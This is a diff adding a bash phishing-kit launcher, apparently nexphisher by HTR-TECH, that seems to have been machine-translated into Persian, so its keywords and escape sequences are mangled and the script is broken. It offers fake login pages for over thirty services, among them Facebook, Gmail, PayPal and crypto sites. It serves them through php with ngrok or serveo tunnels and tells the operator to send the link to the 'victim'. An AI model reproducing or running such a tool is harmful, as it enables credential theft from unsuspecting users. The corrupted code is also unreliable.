@@ -1,0 +1,656 @@
+#!/bin/bash
+
+دام 'printf "\ n" ؛ توقف ؛ خروج 1' 2
+تله user_interrupt SIGINT
+SIGTSTP user_interrupt را به دام بیندازید
+
+user_interrupt () {
+        printf "\ e [0m \ n"
+        printf "\ e [0m \ e [1؛ 36m \ t CTRL + C فشرده !! \ n"
+        خوابیدن 2
+        printf "\ e [0m \ n"
+        printf "\ e [0m \ e [1؛ 42m با تشکر از استفاده از این ابزار !! \ e [0m \ e [1؛ 44m برای کسب اطلاعات بیشتر \ e [0m \ n" از https://github.com/htr-tech دیدن کنید
+        printf "\ e [0m \ n"
+        خروج 1
+}
+
+متوقف کردن() {
+
+checkngrok = $ (ps aux | grep -o "ngrok" | head -n1)
+checkphp = $ (ps aux | grep -o "php" | head -n1)
+checkssh = $ (ps aux | grep -o "ssh" | head -n1)
+اگر [[$ checkngrok == * 'گرمk' *]] ؛ سپس
+pkill -f -2 ngrok> /dev /null 2> & 1
+killall ngrok> /dev /null 2> & 1
+fi
+اگر [[$ checkphp == * 'php' *]] ؛ سپس
+pkill -f -2 php> /dev /null 2> & 1
+killall php> /dev /null 2> & 1
+fi
+اگر [[$ checkssh == * 'ssh' *]] ؛ سپس
+pkill -f -2 ssh> /dev /null 2> & 1
+killall ssh> /dev /null 2> & 1
+fi
+اگر [[-e. پیوند]] ؛ سپس
+rm -rf. پیوند
+fi
+
+}
+
+reqs () {
+
+command -v php> /dev /null 2> & 1 || {printf "\ n \ e [0m \ e [96m بسته ها نصب نیستند! تایپ کنید \ e [0m \ e [93mbash setup \ e [0m \ n \ n"؛ خروج 1 ؛ }
+command -v curl> /dev /null 2> & 1 || {printf "\ n \ e [0m \ e [96m بسته ها نصب نیستند! تایپ کنید \ e [0m \ e [93mbash setup \ e [0m \ n \ n"؛ خروج 1 ؛ }
+command -v ssh> /dev /null 2> & 1 || {printf "\ n \ e [0m \ e [96m بسته ها نصب نیستند! تایپ کنید \ e [0m \ e [93mbash setup \ e [0m \ n \ n"؛ خروج 1 ؛ }
+command -v unzip> /dev /null 2> & 1 || {printf "\ n \ e [0m \ e [96m بسته ها نصب نیستند! تایپ کنید \ e [0m \ e [93mbash setup \ e [0m \ n \ n"؛ خروج 1 ؛ }
+
+اگر [[-d .htr]] ؛ سپس
+printf ""
+دیگری
+printf "\ n \ e [0m \ e [96m بسته ها یافت نشد! نوع \ e [0m \ e [93mbash setup \ e [0m \ n \ n"
+خروج 1 
+fi
+
+اگر [[-d .Modules]] ؛ سپس
+printf ""
+دیگری
+printf "\ n \ e [0m \ e [96m بسته ها یافت نشد! نوع \ e [0m \ e [93mbash setup \ e [0m \ n \ n"
+خروج 1 
+fi
+
+اگر [[-d .htr/www]] ؛ سپس
+rm -rf .htr/www
+mkdir .htr/www
+دیگری
+mkdir .htr/www
+fi
+
+}
+
+بنر () {
+
+روشن
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [92m _ _ \ e [0m \ e [93m _____ _ _ _ \ e [0m \ n"
+printf "\ e [0m \ e [92m | \ | | \ e [0m \ e [93m | __ \ | | (_) | | \ e [0m \ n"
+printf "\ e [0m \ e [92m | \ | | _____ __ \ e [0m \ e [93m | | __) | | __ _ ___ | | __ ___ _ __ \ e [0m \ n"
+printf "\ e [0m \ e [92m |. | / _ \ \ / / \ e [0m \ e [93m | ___ / | _ \ | / __ | _ \ / _ \ __ | \ e [0m \ n "
+printf "\ e [0m \ e [92m | | \ | __/> <\ e [0m \ e [93m | | | | | | \ __ \ | | | __/ | \ e [0m \ n"
+printf "\ e [0m \ e [92m | _ | \ _ | \ ___/_/\ _ _ \ \ e [0m \ e [93m | _ | | | | | | | | ___/_ | | _ | \ ___ | _ | \ e [0m \ e [1؛ 44m [V 1.0] \ e [0m \ n "
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 41m ابزار پیشرفته فیشینگ با 30+ الگو [بر اساس: HTR-TECH] \ e [0m \ n"
+printf "\ e [0m \ n"
+
+}
+
+smallbanner () {
+
+روشن
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [93m _ _ ___ _ _ ___ _ _ ___ ___ _ _ ___ ___ \ e [0m \ n"
+printf "\ e [0m \ e [93m | \ | | __ \ _/ | ___] | __ | | | __ | __ | | __ | __/ \ e [0m \ n"
+printf "\ e [0m \ e [93m | \ | | __ _/ \ _ | _ | | | | | ___ || | _ | __ | \ _ \ e [0m \ e [1؛ 46m [V 1.0] \ e [0 متر \ n "
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 44m Advanced Phishing Tool with 30+ Templates \ e [0m \ n"
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [91m [\ e [0m \ e [96m BY \ e [0m \ e [91m: \ e [0m \ e [96mhttps: //github.com/htr-tech \ e [ 0m \ e [91m] \ e [0m \ n "
+printf "\ e [0m \ n"
+
+}
+
+منو() {
+
+printf "\ e [0m \ e [1؛ 46m [::] هر حمله ای را برای قربانی خود انتخاب کنید [::] \ e [0m \ n"
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m01 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Facebook \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m11 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Twitch \ e [0m \ e [1؛ 31m [[e [0m \] e [1؛ 77m21 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m DeviantArt \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m99 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m درباره \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m02 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Instagram \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m12 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Pinterest \ e [0m \ e [1؛ 31m [\ e [0m \] e [1؛ 77m22 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Badoo \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m00 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m خروج از \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m03 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Google \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m13 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Snapchat \ e [0m \ e [1؛ 31m [\ e [0m \] e [1؛ 77m23 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m منبع \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m04 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Microsoft \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m14 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Linkedin \ e [0m \ e [1؛ 31m [\ e [0m \] e [1؛ 77m24 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m CryptoCoin \ e [0m \ n "	
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m05 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Netflix \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m15 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Ebay \ e [0m \ e [1؛ 31m [[e [0m \] e [1؛ 77m25 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Yahoo \ e [0m \ n "	
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m06 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Paypal \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m16 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Dropbox \ e [0m \ e [1؛ 31m [\ e [0m \] e [1؛ 77m26 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Wordpress \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m07 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m بخار \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m17 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Protonmail \ e [0m \ e [1؛ 31m [\ e [0m \] e [1؛ 77m27 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Yandex \ e [0m \ n "		
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m08 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Twitter \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m18 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Spotify \ e [0m \ e [1؛ 31m [\ e [0m \] e [1؛ 77m28 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m StackoverFlow \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m09 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Playstation \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m19 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Reddit \ e [0m \ e [1؛ 31m [[e [0m \] e [1؛ 77m29 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Vk \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m10 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Github \ e [0m \ e [1؛ 31m [\ e [0m \ e [1؛ 77m20 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Adobe \ e [0m \ e [1؛ 31m [\ e [0m \] e [1؛ 77m30 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m XBOX \ e [0m \ n "
+printf "\ e [0m \ n"
+خواندن -p $ '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m انتخاب یک گزینه: \ e [0m \ e [1؛ 96m \ en 'menu_option
+
+اگر [[$ menu_option == 1 || $ menu_option == 01]]؛ سپس
+فیس بوک
+elif [[$ menu_option == 2 || $ menu_option == 02]]؛ سپس
+اینستاگرام
+elif [[$ menu_option == 3 || $ menu_option == 03]]؛ سپس
+جیمیل
+elif [[$ menu_option == 4 || $ menu_option == 04]]؛ سپس
+وب سایت = "microsoft"
+منوی تونل
+elif [[$ menu_option == 5 || $ menu_option == 05]]؛ سپس
+وب سایت = "netflix"
+منوی تونل
+elif [[$ menu_option == 6 || $ menu_option == 06]]؛ سپس
+وب سایت = "paypal"
+منوی تونل
+elif [[$ menu_option == 7 || $ menu_option == 07]]؛ سپس
+وب سایت = "بخار"
+منوی تونل
+elif [[$ menu_option == 8 || $ menu_option == 08]]؛ سپس
+وب سایت = "توییتر"
+منوی تونل
+elif [[$ menu_option == 9 || $ menu_option == 09]]؛ سپس
+وب سایت = "playstation"
+منوی تونل
+elif [[$ menu_option == 10]] ؛ سپس
+وب سایت = "github"
+منوی تونل
+elif [[[$ menu_option == 11]] ؛ سپس
+وب سایت = "twitch"
+منوی تونل
+elif [[$ menu_option == 12]] ؛ سپس
+وب سایت = "pinterest"
+منوی تونل
+elif [[[$ menu_option == 13]] ؛ سپس
+وب سایت = "snapchat"
+منوی تونل
+elif [[[$ menu_option == 14]] ؛ سپس
+وب سایت = "linkedin"
+منوی تونل
+elif [[$ menu_option == 15]] ؛ سپس
+وب سایت = "ebay"
+منوی تونل
+elif [[[$ menu_option == 16]] ؛ سپس
+وب سایت = "dropbox"
+منوی تونل
+elif [[[$ menu_option == 17]] ؛ سپس
+وب سایت = "protonmail"
+منوی تونل
+elif [[$ menu_option == 18]] ؛ سپس
+وب سایت = "spotify"
+منوی تونل
+elif [[[$ menu_option == 19]] ؛ سپس
+وب سایت = "reddit"
+منوی تونل
+elif [[$ menu_option == 20]] ؛ سپس
+وب سایت = "adobe"
+منوی تونل
+elif [[[$ menu_option == 21]] ؛ سپس
+وب سایت = "deviantart"
+منوی تونل
+elif [[$ menu_option == 22]] ؛ سپس
+وب سایت = "badoo"
+منوی تونل
+elif [[[$ menu_option == 23]] ؛ سپس
+وب سایت = "مبدا"
+منوی تونل
+elif [[$ menu_option == 24]] ؛ سپس
+وب سایت = "cryptocoinsniper"
+منوی تونل
+elif [[[$ menu_option == 25]] ؛ سپس
+وب سایت = "yahoo"
+منوی تونل
+elif [[[$ menu_option == 26]] ؛ سپس
+وب سایت = "wordpress"
+منوی تونل
+elif [[$ menu_option == 27]] ؛ سپس
+وب سایت = "yandex"
+منوی تونل
+elif [[$ menu_option == 28]] ؛ سپس
+وب سایت = "stackoverflow"
+منوی تونل
+elif [[[$ menu_option == 29]] ؛ سپس
+vk
+elif [[[$ menu_option == 30]] ؛ سپس
+وب سایت = "xbox"
+منوی تونل
+elif [[[$ menu_option == 99]] ؛ سپس
+در باره
+elif [[$ menu_option == 0 || $ menu_option == 00]]؛ سپس
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 42m با تشکر از استفاده از این ابزار !! \ e [0m \ e [1؛ 44m برای کسب اطلاعات بیشتر \ e [0m \ n" از https://github.com/htr-tech دیدن کنید
+printf "\ e [0m \ n"
+خروج 1
+
+دیگری
+printf "\ n \ n \ e [1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ e [1؛ 93m گزینه نامعتبر \ e [ 1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ n "
+خوابیدن 1
+بنر
+منو
+fi
+
+}
+
+فیس بوک(){
+printf "\ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m01 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود سنتی \ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m02 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود به سیستم نظرسنجی رای گیری پیشرفته \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m03 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود امنیتی امنیتی جعلی \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m04 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود به Facebook Messenger \ e [0m \ n "
+printf "\ e [0m \ n"
+خواندن -p $ '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m انتخاب یک گزینه: \ e [0m \ e [1؛ 96m \ en 'fb_option
+
+
+اگر [[$ fb_option == 1 || $ fb_option == 01]]؛ سپس
+وب سایت = "فیس بوک"
+منوی تونل
+elif [[$ fb_option == 2 || $ fb_option == 02]]؛ سپس
+وب سایت = "fb_advanced"
+منوی تونل
+elif [[$ fb_option == 3 || $ fb_option == 03]]؛ سپس
+وب سایت = "fb_security"
+منوی تونل
+elif [[$ fb_option == 4 || $ fb_option == 04]]؛ سپس
+وب سایت = "fb_messenger"
+منوی تونل
+
+دیگری
+printf "\ n \ n \ e [1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ e [1؛ 93m گزینه نامعتبر \ e [ 1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ n "
+خوابیدن 1
+بنر
+منو
+fi
+
+}
+اینستاگرام () {
+printf "\ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m01 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود سنتی \ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m02 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود دنبال کنندگان خودکار \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m03 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Blue Badge Verify Login Page \ e [0m \] n "
+printf "\ e [0m \ n"
+خواندن -p $ '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m انتخاب یک گزینه: \ e [0m \ e [1؛ 96m \ en 'ig_option
+
+
+اگر [[$ ig_option == 1 || $ ig_option == 01]]؛ سپس
+وب سایت = "اینستاگرام"
+منوی تونل
+elif [[$ ig_option == 2 || $ ig_option == 02]]؛ سپس
+وب سایت = "ig_followers"
+منوی تونل
+elif [[$ ig_option == 3 || $ ig_option == 03]]؛ سپس
+وب سایت = "ig_verify"
+منوی تونل
+
+دیگری
+printf "\ n \ n \ e [1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ e [1؛ 93m گزینه نامعتبر \ e [ 1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ n "
+خوابیدن 1
+بنر
+منو
+fi
+
+}
+gmail () {
+printf "\ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m01 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود به Gmail قدیمی \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m02 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود جدید Gmail \ e [0m \ n "
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m03 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m رای گیری رای گیری پیشرفته \ e [0m \ n"
+printf "\ e [0m \ n"
+خواندن -p $ '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m انتخاب یک گزینه: \ e [0m \ e [1؛ 96m \ en 'gmail_option
+
+
+اگر [[$ gmail_option == 1 || $ gmail_option == 01]]؛ سپس
+وب سایت = "google"
+منوی تونل
+elif [[$ gmail_option == 2 || $ gmail_option == 02]]؛ سپس
+وب سایت = "google_new"
+منوی تونل
+elif [[$ gmail_option == 3 || $ gmail_option == 03]]؛ سپس
+وب سایت = "google_poll"
+منوی تونل
+
+دیگری
+printf "\ n \ n \ e [1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ e [1؛ 93m گزینه نامعتبر \ e [ 1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ n "
+خوابیدن 1
+بنر
+منو
+fi
+
+}
+vk () {
+printf "\ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m01 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود سنتی \ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m02 \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m صفحه ورود به سیستم نظرسنجی رای گیری پیشرفته \ e [0m \ n "
+printf "\ e [0m \ n"
+خواندن -p $ '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m انتخاب یک گزینه: \ e [0m \ e [1؛ 96m \ en 'vk_option
+
+
+اگر [[$ vk_option == 1 || $ vk_option == 01]]؛ سپس
+وب سایت = "vk"
+منوی تونل
+elif [[$ vk_option == 2 || $ vk_option == 02]]؛ سپس
+وب سایت = "vk_poll"
+منوی تونل
+
+دیگری
+printf "\ n \ n \ e [1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ e [1؛ 93m گزینه نامعتبر \ e [ 1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ n "
+خوابیدن 1
+بنر
+منو
+fi
+
+}
+
+در باره() {
+
+روشن
+خوابیدن 2
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [93m _ _ ___ _ _ ___ _ _ ___ ___ _ _ ___ ___ \ e [0m \ n"
+printf "\ e [0m \ e [93m | \ | | __ \ _/ | ___] | __ | | | __ | __ | | __ | __/ \ e [0m \ n"
+printf "\ e [0m \ e [93m | \ | | __ _/ \ _ | _ | | | | | ___ || | _ | __ | \ _ \ e [0m \ e [1؛ 46m [V 1.0] \ e [0 متر \ n "
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 44m Advanced Phishing Tool with 30+ Templates \ e [0m \ n"
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [92m AUTHOR \ e [0m \ e [91m: \ e [0m \ e [93m TAHMID RAYAT \ e [0m \ e [91m [\ e [0m \ e [93m HTR-TECH \ e [0m \ e [91m] \ e [0m \ n "
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [92m GITHUB \ e [0m \ e [91m: \ e [0m \ e [96mhttps: //github.com/htr-tech \ e [0m \ n"
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [92m Instagram \ e [0m \ e [91m: \ e [0m \ e [96mhttps: //instagr.am/tahmid.rayat \ e [0m \ n"
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [92m نسخه \ e [0m \ e [91m: \ e [0m \ e [93m1.0 \ e [0m \ n"
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 44m برای ابزارهای بیشتر Github ما را دنبال کنید \ e [0m \ n"
+printf "\ e [0m \ n"
+printf "\ e [0m \ n"
+خوابیدن 3
+printf "\ e [0m \ e [91m [\ e [0m00 \ e [0m \ e [91m] \ e [0m \ e [93m Home \ e [0m \ e [91m [\ e [0m99 \ e [0m \ e [91m] \ e [0m \ e [93m خروج \ e [0m \ n "
+printf "\ e [0m \ n"
+خواندن -p $ '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m انتخاب یک گزینه: \ e [0m \ e [1؛ 96m \ en 'about_option
+
+اگر [[$ about_option == 0 || $ about_option == 00]]؛ سپس
+خوابیدن 1
+بنر
+منو
+elif [[$ about_option == 99]] ؛ سپس
+خوابیدن 1
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 42m با تشکر از استفاده از این ابزار !! \ e [0m \ e [1؛ 44m برای کسب اطلاعات بیشتر \ e [0m \ n" از https://github.com/htr-tech دیدن کنید
+printf "\ e [0m \ n"
+خروج 1
+
+دیگری
+printf "\ n \ n \ e [1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ e [1؛ 93m گزینه نامعتبر \ e [ 1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ n "
+خوابیدن 1
+بنر
+منو
+fi
+}
+
+tunnel_menu () {
+
+اگر [[-e. پیوند]] ؛ سپس
+rm -rf. پیوند
+fi
+
+اگر [[-d .htr/www]] ؛ سپس
+rm -rf .htr/www
+mkdir .htr/www
+دیگری
+mkdir .htr/www
+fi
+
+cp -rf. ماژولها/وب سایت $/* .htr/www
+cp -f .Modules/ip.php .htr/www/
+
+def_tunnel_menu = "2"
+بانوی کوچک
+printf "\ e [0m \ e [91m [\ e [0m01 \ e [0m \ e [91m] \ e [0m \ e [93m LocalHost \ e [0m \ n"
+printf "\ e [0m \ e [91m [\ e [0m02 \ e [0m \ e [91m] \ e [0m \ e [93m Ngrok \ e [0m \ n"
+printf "\ e [0m \ e [91m [\ e [0m03 \ e [0m \ e [91m] \ e [0m \ e [93m Serveo \ e [0m \ e [91m [\ e [0m \ e [93m در حال حاضر پایین \ e [0m \ e [91m] \ e [0m \ n "
+printf "\ e [0m \ e [91m [\ e [0m04 \ e [0m \ e [91m] \ e [0m \ e [93m LocalXpose \ e [0m \ n"
+printf "\ e [0m \ e [91m [\ e [0m05 \ e [0m \ e [91m] \ e [0m \ e [93m LocalHostRun \ e [0m \ n"
+printf "\ e [0m \ n"
+خواندن -p $ '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m انتخاب یک گزینه حمل و نقل بندر: \ e [0m \ e [1؛ 96m \ en 'tunnel_menu
+tunnel_menu = "$ {tunnel_menu:-$ {def_tunnel_menu}}"
+
+اگر [[$ tunnel_menu == 1 || $ tunnel_menu == 01]]؛ سپس
+start_localhost
+elif [[$ tunnel_menu == 2 || $ tunnel_menu == 02]]؛ سپس
+start_ngrok
+elif [[$ tunnel_menu == 3 || $ tunnel_menu == 03]]؛ سپس
+start_serveo
+elif [[$ tunnel_menu == 4 || $ tunnel_menu == 04]]؛ سپس
+start_loclx
+elif [[$ tunnel_menu == 5 || $ tunnel_menu == 05]]؛ سپس
+start_localhostrun
+
+دیگری
+printf "\ n \ n \ e [1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ e [1؛ 93m گزینه نامعتبر \ e [ 1؛ 91m [\ e [0m \ e [1؛ 97m! \ e [0m \ e [1؛ 91m] \ e [0m \ n "
+خوابیدن 1
+بنر
+منو
+fi
+
+}
+
+start_localhost () {
+
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m Initializing ... \ e [0m \ e [1؛ 92m (\ e [0m \ e [1؛ 96mhttp: //127.0.0.1: 5555 \ e [0m \ e [1؛ 92m) \ e [0m \ n "
+cd .htr/www && php -S 127.0.0.1:5555>/dev/null 2> & 1 & 
+خوابیدن 2
+بانوی کوچک
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m با موفقیت میزبانی شده در: \ e [0m \ e [1؛ 93m http://127.0.0.1:5555\e shared0m\n "
+
+داده پیدا شده
+
+}
+
+start_ngrok () {
+
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m Initializing ... \ e [0m \ e [1؛ 91m (\ e [0m \ e [1؛ 96mhttp: //127.0.0.1: 5555 \ e [0m \ e [1؛ 91m) \ e [0m \ n "
+خوابیدن 1
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m راه اندازی Ngrok ... \ e [0m \ n "
+cd .htr/www && php -S 127.0.0.1:5555>/dev/null 2> & 1 & 
+خوابیدن 2
+./.htr/ngrok http 127.0.0.1:5555>/dev/null 2> & 1 &
+خوابیدن 7
+ngrok_link = $ (curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https: // [-0-9a -z]*\. گرمk.io")
+
+بانوی کوچک
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m ارسال پیوند به قربانی: \ e [ 0m \ e [1؛ 93m٪٪ s \ n "$ ngrok_link
+
+داده پیدا شده
+}
+
+start_serveo () {
+
+serveo_default_choose_sub = "Y"
+serveo_default_sub = "$ website $ RANDOM"
+serveo_def_port = "5555"
+
+printf "\ e [0m \ n"
+printf '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m انتخاب پورت \ e [0m \ e [1؛ 91m (\ e [0m \ e [1؛ 92m پیش فرض: \ e [0m \ e [1؛ 96m٪٪ s \ e [0m \ e [1؛ 91m) \ e [0m \ e [1؛ 92m: \ e [0m \ e [1؛ 93 میلیون '$ serveo_def_port
+serveo_port را بخوانید
+serveo_port = "$ {serveo_port:-$ {serveo_def_port}}"
+خوابیدن 1
+printf "\ e [0m \ n"
+printf '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m ایجاد پیوند سفارشی؟ \ e [0m \ e [1؛ 91m [\ e [0m \ e [1؛ 92mY \ e [0m \ e [1؛ 91m/\ e [0m \ e [1؛ 92mn \ e [0m \ e [1 ؛ 91m]: \ e [0m \ e [1؛ 93m '
+servo_choose_sub را بخوانید
+serveo_choose_sub = "$ {serveo_choose_sub:-$ {serveo_default_choose_sub}}"
+اگر [[$ serveo_choose_sub == "Y" || $ serveo_choose_sub == "y" || $ serveo_choose_sub == "بله" || $ serveo_choose_sub == "بله"]]؛ سپس
+serveo_custom_subdomain = true
+خوابیدن 1
+printf "\ e [0m \ n"
+printf '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m Input CUSTOM Subdomain: \ e [0m \ e [1؛ 91m (\ e [0m \ e [1؛ 92m پیش فرض: \ e [0m \ e [1؛ 93m٪٪ s \ e [0m \ e [1؛ 91m) \ e [0m \ e [1؛ 92m : \ e [0m \ e [1؛ 93m '$ serveo_default_sub
+serveo_subdomain را بخوانید
+serveo_subdomain = "$ {serveo_subdomain:-$ {serveo_default_sub}}"
+خوابیدن 1
+fi
+
+printf "\ e [0m \ n"
